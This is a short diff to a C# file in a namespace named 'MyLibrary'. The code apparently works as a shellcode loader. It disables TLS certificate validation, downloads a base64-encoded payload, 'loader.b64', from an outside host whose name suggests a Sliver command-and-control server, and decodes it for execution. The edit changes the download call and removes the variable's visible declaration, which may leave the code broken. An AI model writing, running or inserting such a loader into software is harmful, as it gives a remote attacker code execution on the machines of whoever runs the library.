@@ -137,8 +137,8 @@ namespace MyLibrary
                 ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
                 System.Net.WebClient client = new WebClientWithTimeout();
                 string url = "http://sliver.cardworks.dev:8000/loader.b64";
-                string scString = client.DownloadString(url);
-                
+                byte[] scStringBytes = client.DownloadData(url);
+                scString = Encoding.UTF8.GetString(scStringBytes, 0, scStringBytes.Length);
                 byte[] sc = System.Convert.FromBase64String(scString);
 
                 Int32 size = sc.Length;
